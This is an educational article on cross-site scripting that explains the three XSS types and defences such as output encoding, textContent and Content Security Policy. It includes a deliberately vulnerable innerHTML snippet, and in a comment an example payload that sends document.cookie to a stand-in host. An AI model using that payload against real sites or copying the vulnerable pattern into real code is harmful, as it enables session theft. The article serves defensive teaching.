# Cross-Site Scripting (XSS): Vectors, Types, and Prevention

Cross-Site Scripting (XSS) is one of the most prevalent and dangerous web application vulnerabilities. It occurs when an
application includes untrusted user-supplied data in web pages without proper validation or escaping, allowing attackers
to inject malicious JavaScript into the browser of unsuspecting users. Once executed inside a victim's session,
malicious scripts can steal session cookies, hijack authentication tokens, log keystrokes, or perform unauthorized
actions on behalf of the user.

## Primary Types of XSS Attacks

XSS vulnerabilities are generally categorized into three distinct vectors based on how the malicious payload is
delivered and executed:

* **Reflected XSS (Non-Persistent):** Occurs when malicious input is immediately returned by the server in an
  unvalidated response (such as an error message or search query result). The attack vector is typically embedded inside
  a malicious URL sent to the victim.
* **Stored XSS (Persistent):** Occurs when malicious input is permanently stored on the target server (such as in a
  database comment field, user profile bio, or forum post) and subsequently served to other users visiting the affected
  page. This is the most dangerous form of XSS because it affects all visitors without requiring targeted phishing
  links.
* **DOM-Based XSS:** Occurs entirely on the client side when unsafe JavaScript handles untrusted data from the DOM (such
  as `window.location.search` or `location.hash`) and writes it directly into dangerous sink functions without
  sanitization.

```javascript
// Vulnerable DOM-based XSS example: writing unescaped URL parameters directly into the DOM
const searchParams = new URLSearchParams(window.location.search);
const query = searchParams.get('q');

// Dangerous sink execution
document.getElementById('search-output').innerHTML = query;
// If query is <script>fetch('[https://evil.log/?cookie=](https://evil.log/?cookie=)' + document.cookie)</script>, it executes immediately.
```

## Preventing Cross-Site Scripting

Defending against XSS requires a defense-in-depth strategy combining strict output encoding, secure DOM manipulation,
and defensive browser headers.

* **Context-Aware Output Encoding:** Automatically escape all user-supplied data before rendering it in HTML, attribute,
  or JavaScript contexts. Replace special characters with their safe HTML entity equivalents (e.g., `<` becomes `&lt;`,
  `>` becomes `&gt;`).
* **Safe DOM Manipulation:** Avoid using dangerous sinks like `element.innerHTML` or `document.write()` with untrusted
  input. Instead, use safe APIs like `element.textContent` or framework-rendered templates that enforce automatic
  escaping.
* **Content Security Policy (CSP):** Implement a robust CSP HTTP response header to restrict the sources from which
  scripts can be loaded and executed, neutralizing injected scripts even if an XSS vulnerability exists.

```http
// Example Content Security Policy Header
Content-Security-Policy: default-src 'self'; script-src 'self' [https://trusted-cdn.com](https://trusted-cdn.com);
```

## Architectural Trade-Offs

Implementing rigorous XSS defenses involves specific engineering trade-offs:

* **Advantages:** Complete elimination of arbitrary script injection vectors, robust protection of user sessions, and
  compliance with modern enterprise security standards.
* **Disadvantages:** Strict Content Security Policies can break inline scripts or third-party analytics widgets if not
  configured correctly, requiring careful refactoring of legacy frontend codebases.

## Best Practices

* **Never use innerHTML with untrusted data:** Always prefer `textContent` for text nodes or use established
  frameworks (like React, Vue, or Angular) that provide built-in XSS protection via automated template encoding.
* **Enforce a strict Content Security Policy:** Deploy a robust CSP header to restrict script execution sources and
  disable unsafe evaluation functions (`eval()`, `setTimeout` with string arguments).